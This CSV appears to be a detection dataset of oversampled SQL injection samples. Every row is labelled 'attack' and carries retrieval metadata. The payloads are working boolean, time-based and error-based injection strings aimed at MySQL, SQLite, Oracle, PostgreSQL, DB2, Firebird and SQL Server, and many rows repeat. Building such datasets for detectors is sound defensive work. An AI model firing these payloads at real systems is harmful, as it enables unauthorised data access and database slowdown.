id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000328,attack,boolean,"-6496""   )    )     )   or 1471  =  5278 and    (    (     (  ""zkoj""  =  ""zkoj",nearest_attack_euclidean,R000070,2.151993895355829
SMOTE_000329,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000118,0.26203335273425105
SMOTE_000330,attack,boolean,"1"" where 5216  =  5216 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000127,0.9563945227240985
SMOTE_000331,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000104,0.029356733469885994
SMOTE_000332,attack,boolean,"1'  )   as juxt where 5956  =  5956 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000144,0.28008311852804313
SMOTE_000333,attack,boolean,1' and 7533  =  7533 and 'frvk'  =  'frvk,nearest_attack_euclidean,R000039,2.482871927190559
SMOTE_000334,attack,boolean," end and   (  ""xksk""  =  ""xksk",nearest_attack_euclidean,R000019,3.0969382610017524
SMOTE_000335,attack,boolean,"1' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'eqyr' like 'eqyr",nearest_attack_euclidean,R000132,2.1398832078535737
SMOTE_000336,attack,boolean,"-7731""   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   ""unly"" like ""unly",nearest_attack_euclidean,R000050,2.3110547042082046
SMOTE_000337,attack,boolean,-2174'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'dyyg'  =  'dyyg,nearest_attack_euclidean,R000109,0.7430726318736264
SMOTE_000338,attack,boolean,1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rzwb'  =  'rzwb,nearest_attack_euclidean,R000035,1.4743321906780082
SMOTE_000339,attack,boolean,"1""  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""vudj"" like ""vudj",nearest_attack_euclidean,R000055,0.49350219541728063
SMOTE_000340,attack,boolean,1   )    )     )   and 9575  =  1640--,nearest_attack_euclidean,R000078,0.4955939596604468
SMOTE_000341,attack,boolean,"1' in boolean mode  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000028,1.1003784108305161
SMOTE_000342,attack,boolean,"1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""xhqc""  =  ""xhqc",nearest_attack_euclidean,R000142,1.3063648733956492
SMOTE_000343,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   ""%""  =  """,nearest_attack_euclidean,R000030,1.4970545376678432
SMOTE_000344,attack,boolean,"-6496""   )    )     )   or 1471  =  5278 and    (    (     (  ""zkoj""  =  ""zkoj",nearest_attack_euclidean,R000070,0.42920571505461597
SMOTE_000345,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000085,1.26326701694448
SMOTE_000346,attack,boolean,"1'  )   as juxt where 5956  =  5956 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000144,0.11049414375458651
SMOTE_000347,attack,boolean,"1""   )    )    as ltco where 3862  =  3862 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000023,0.5260665551499822
SMOTE_000348,attack,boolean,"1%' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",nearest_attack_euclidean,R000018,1.7813408872212362
SMOTE_000349,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000140,1.4534696984361968
SMOTE_000350,attack,boolean,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000125,0.0031739090941816416
SMOTE_000351,attack,boolean,"1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000059,1.712462418317559
SMOTE_000352,attack,boolean,"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000098,0.24634845907072594
SMOTE_000353,attack,boolean,select * from users where id  =  1.<@$ or 1  =  1 -- 1,nearest_attack_euclidean,R000008,0.048812234857196546
SMOTE_000354,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000104,1.0892865827620637
SMOTE_000355,attack,boolean,"1""  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""vudj"" like ""vudj",nearest_attack_euclidean,R000055,1.5107073903071517
SMOTE_000356,attack,boolean,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000044,0.8715065297176736
SMOTE_000357,attack,boolean,select * from users where id  =  1.<@$ or 1  =  1 -- 1,nearest_attack_euclidean,R000008,2.874928635680083
SMOTE_000358,attack,boolean,"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000123,1.1506560573104114
SMOTE_000359,attack,boolean,select * from users where id  =  1.<@$ or 1  =  1 -- 1,nearest_attack_euclidean,R000008,1.7131017314973125
SMOTE_000360,attack,boolean,"1  )   where 2679  =  2679 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000128,0.9070973497100328
SMOTE_000361,attack,boolean," select * from users where id  =  1 or ""?%"" or 1  =  1 -- 1",nearest_attack_euclidean,R000007,2.270404277831647
SMOTE_000362,attack,boolean,"1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000111,0.7422165007522051
SMOTE_000363,attack,boolean,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000044,3.1276934704390875
SMOTE_000364,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  ""dskh""  =  ""dskh",nearest_attack_euclidean,R000154,0.39603895841060277
SMOTE_000365,attack,boolean,"1 where 7522  =  7522 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",nearest_attack_euclidean,R000117,3.2089328199407747
SMOTE_000366,attack,boolean,"1   )    )    and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000054,0.5662529912138617
SMOTE_000367,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000048,1.0233010838348424
SMOTE_000368,attack,boolean,"1'  )   as juxt where 5956  =  5956 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000144,0.36850642989269733
SMOTE_000369,attack,boolean,"1%""   )    )     )   and 3116  =  9088#",nearest_attack_euclidean,R000041,1.4157254834477921
SMOTE_000370,attack,boolean,1   )    )     )   and 9575  =  1640--,nearest_attack_euclidean,R000078,1.0071125494845696
SMOTE_000371,attack,boolean,"-6496""   )    )     )   or 1471  =  5278 and    (    (     (  ""zkoj""  =  ""zkoj",nearest_attack_euclidean,R000070,0.476759511316584
SMOTE_000372,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""yobb"" like ""yobb",nearest_attack_euclidean,R000084,0.4284914689217278
SMOTE_000373,attack,boolean,1'   )    )    as pdrg where 5960  =  5960 and 9198  =  9198--,nearest_attack_euclidean,R000121,1.117984163757956
SMOTE_000374,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000053,0.21410114055462592
SMOTE_000375,attack,boolean,""" or isNULL  (  1/0  )   /*",nearest_attack_euclidean,R000005,0.17617975590199564
SMOTE_000376,attack,boolean,"1"" or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000026,1.705082924377844
SMOTE_000377,attack,boolean,or 'unusual'   =   'unusual',nearest_attack_euclidean,R000002,2.8625379045402
SMOTE_000378,attack,boolean,-9148  )   where 2027  =  2027 or 8571  =  8571--,nearest_attack_euclidean,R000047,0.1881928510852705
SMOTE_000379,attack,boolean,"1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000111,0.6187331039123188
SMOTE_000380,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000104,1.3479895316152655
SMOTE_000381,attack,boolean,"1  )   where 2679  =  2679 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000128,0.519740548302113
SMOTE_000382,attack,boolean,"1%""   )    )     )   and 3116  =  9088#",nearest_attack_euclidean,R000041,2.8227261235561607
SMOTE_000383,attack,boolean,-2504'   )    )     )   or 8723  =  9715,nearest_attack_euclidean,R000097,0.7673901869141517
SMOTE_000384,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""yobb"" like ""yobb",nearest_attack_euclidean,R000084,1.5323039406315688
SMOTE_000385,attack,boolean,"1""   )    )    as wnzf where 3352  =  3352 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000067,0.302765368336463
SMOTE_000386,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""gzhp""  =  ""gzhp",nearest_attack_euclidean,R000126,1.0014088853020873
SMOTE_000387,attack,boolean,-2717'   )    )     )   or 8571  =  8571--,nearest_attack_euclidean,R000073,1.3635927064715416
SMOTE_000388,attack,boolean,"1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000059,1.1003743951449023
SMOTE_000389,attack,boolean,1' in boolean mode  )   and 5725  =  5552#,nearest_attack_euclidean,R000081,2.1855920229062984
SMOTE_000390,attack,boolean,"1'  )   as tuhc where 4018  =  4018 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000122,1.4870029016745818
SMOTE_000391,attack,boolean,"1 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  -- pvdw",nearest_attack_euclidean,R000042,1.4417267376946032
SMOTE_000392,attack,boolean,"1' in boolean mode  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000028,0.5417111497047238
SMOTE_000393,attack,boolean,"1'||  (  select 'hwyv' from dual where 1155  =  1155 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  ||'",nearest_attack_euclidean,R000120,1.0990921450114228
SMOTE_000394,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'cixa' like 'cixa",nearest_attack_euclidean,R000136,1.8276327695803734
SMOTE_000395,attack,boolean,"1'  )   as juxt where 5956  =  5956 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000144,0.41702951684882233
SMOTE_000396,attack,boolean,"1   )    )    as prnp where 4932  =  4932 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000068,1.8199143798240656
SMOTE_000397,attack,boolean,-2504'   )    )     )   or 8723  =  9715,nearest_attack_euclidean,R000097,0.5895332787461997
SMOTE_000398,attack,boolean,1'   )    )    as pdrg where 5960  =  5960 and 9198  =  9198--,nearest_attack_euclidean,R000121,1.041057155236705
SMOTE_000399,attack,boolean,"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  ",nearest_attack_euclidean,R000103,1.270829037266267
SMOTE_000400,attack,boolean,"-8429'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'bwih' like 'bwih",nearest_attack_euclidean,R000031,0.1835094423638807
SMOTE_000401,attack,boolean,"1%'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  '%'  =  '",nearest_attack_euclidean,R000150,1.6671954224888694
SMOTE_000402,attack,boolean,"1""  )   as upjw where 3880  =  3880 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000072,0.9726245655465372
SMOTE_000403,attack,boolean,"1"" or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000026,0.5311428161081007
SMOTE_000404,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000048,0.5659866062831517
SMOTE_000405,attack,boolean,"1 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  -- pvdw",nearest_attack_euclidean,R000042,1.1830586712749986
SMOTE_000406,attack,boolean,"-1064' or make_set  (  6439  =  2937,2937  )   and 'qojd'  =  'qojd",nearest_attack_euclidean,R000012,1.284395911251434
SMOTE_000407,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000101,0.5597400632711175
SMOTE_000408,attack,boolean,"1"" and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",nearest_attack_euclidean,R000052,1.0093142255838459
SMOTE_000409,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   ""%""  =  """,nearest_attack_euclidean,R000030,0.09625530792993633
SMOTE_000410,attack,boolean,"1%""   )    )     )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000088,0.20584230689459004
SMOTE_000411,attack,boolean,or 'unusual'   =   'unusual',nearest_attack_euclidean,R000002,0.5399812359704946
SMOTE_000412,attack,boolean,"1""  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000015,0.046360071062940475
SMOTE_000413,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000100,0.7014186724570022
SMOTE_000414,attack,boolean,"1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""xhqc""  =  ""xhqc",nearest_attack_euclidean,R000142,0.1386410993388345
SMOTE_000415,attack,boolean,"-1064' or make_set  (  6439  =  2937,2937  )   and 'qojd'  =  'qojd",nearest_attack_euclidean,R000012,0.8142732014637782
SMOTE_000416,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000118,0.1286043993546664
SMOTE_000417,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000118,2.041560166820419
SMOTE_000418,attack,boolean,admin' or '1'  =  '1'/*,nearest_attack_euclidean,R000009,1.8131658432012223
SMOTE_000419,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  'wweo'  =  'wweo",nearest_attack_euclidean,R000046,0.9325880132078166
SMOTE_000420,attack,boolean,"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000151,1.542970713201717
SMOTE_000421,attack,boolean,"1"" where 2642  =  2642 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000133,0.20859653363716008
SMOTE_000422,attack,boolean,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'wzrj'  =  'wzrj",nearest_attack_euclidean,R000112,0.1521139239318595
SMOTE_000423,attack,boolean,"1%'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000145,0.6365363150427809
SMOTE_000424,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  ""dskh""  =  ""dskh",nearest_attack_euclidean,R000154,0.8218546937363962
SMOTE_000425,attack,boolean,"1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000113,1.3469034679461338
SMOTE_000426,attack,boolean,"1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000113,0.32220997740057633
SMOTE_000427,attack,boolean,"1' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'eqyr' like 'eqyr",nearest_attack_euclidean,R000132,2.443537701342646
SMOTE_000428,attack,boolean,"1' and make_set  (  3445  =  5963,5963  )   and 'wjfw'  =  'wjfw",nearest_attack_euclidean,R000021,0.8859633226727085
SMOTE_000429,attack,boolean,"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000098,0.3999179996903598
SMOTE_000430,attack,boolean,"1 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000033,0.2846202996873423
SMOTE_000431,attack,boolean,"1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""xhqc""  =  ""xhqc",nearest_attack_euclidean,R000142,2.026714034357525
SMOTE_000432,attack,boolean,"1 where 7522  =  7522 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",nearest_attack_euclidean,R000117,3.5148578907728987
SMOTE_000433,attack,boolean,1%'   )    )     )   and 1661  =  7683,nearest_attack_euclidean,R000025,0.08156202882033371
SMOTE_000434,attack,boolean,"1%""   )    )     )   and 3116  =  9088#",nearest_attack_euclidean,R000041,1.4260049518823674
SMOTE_000435,attack,boolean,"-4462%""  )   or 8571  =  8571--",nearest_attack_euclidean,R000086,1.1756903896649764
SMOTE_000436,attack,boolean,"1""  )   as jidc where 6093  =  6093 and 9198  =  9198--",nearest_attack_euclidean,R000107,0.741332294093581
SMOTE_000437,attack,boolean,"1' in boolean mode  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000028,0.26562980782327983
SMOTE_000438,attack,boolean,"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000123,0.01984876177041639
SMOTE_000439,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   ""%""  =  """,nearest_attack_euclidean,R000030,0.3601753692168302
SMOTE_000440,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""eevk""  =  ""eevk",nearest_attack_euclidean,R000016,0.013495629144398714
SMOTE_000441,attack,boolean,"1' where 6417  =  6417 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000079,1.6344720621205326
SMOTE_000442,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000140,0.3008815966705974
SMOTE_000443,attack,boolean,1   )    )     )   and 9575  =  1640--,nearest_attack_euclidean,R000078,0.9608564016967727
SMOTE_000444,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   ""%""  =  """,nearest_attack_euclidean,R000030,0.23143656683287084
SMOTE_000445,attack,boolean,"1""   )    )     )   rlike   (  select   (  case when   (  6915  =  4531  )   then 1 else 0x28 end   )    )    and    (    (     (  ""jzzu""  =  ""jzzu",nearest_attack_euclidean,R000093,3.017355306257137
SMOTE_000446,attack,boolean,1%'   )    )     )   and 1661  =  7683,nearest_attack_euclidean,R000025,0.7744885148970715
SMOTE_000447,attack,boolean,"-7731""   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   ""unly"" like ""unly",nearest_attack_euclidean,R000050,1.3031846000551939
SMOTE_000448,attack,boolean,"1' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and 'rhzy'  =  'rhzy",nearest_attack_euclidean,R000017,0.6095194676847318
SMOTE_000449,attack,boolean,1'+  (  select bfeq where 3445  =  3445 and 9198  =  9198--,nearest_attack_euclidean,R000149,1.593932163646245
SMOTE_000450,attack,boolean,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000152,0.47680421313499805
SMOTE_000451,attack,boolean,"1 where 7240  =  7240 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000065,0.7904609059897694
SMOTE_000452,attack,boolean,"1'||  (  select 'hwyv' from dual where 1155  =  1155 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  ||'",nearest_attack_euclidean,R000120,2.5910491759012046
SMOTE_000453,attack,boolean,"1   )    )    as xsyk where 2575  =  2575 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000051,1.5335609695102683
SMOTE_000454,attack,boolean,1%'   )    )     )   and 1661  =  7683,nearest_attack_euclidean,R000025,0.41634649577912447
SMOTE_000455,attack,boolean,"1%'   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000134,0.47116051146962074
SMOTE_000456,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000038,1.6359870194158561
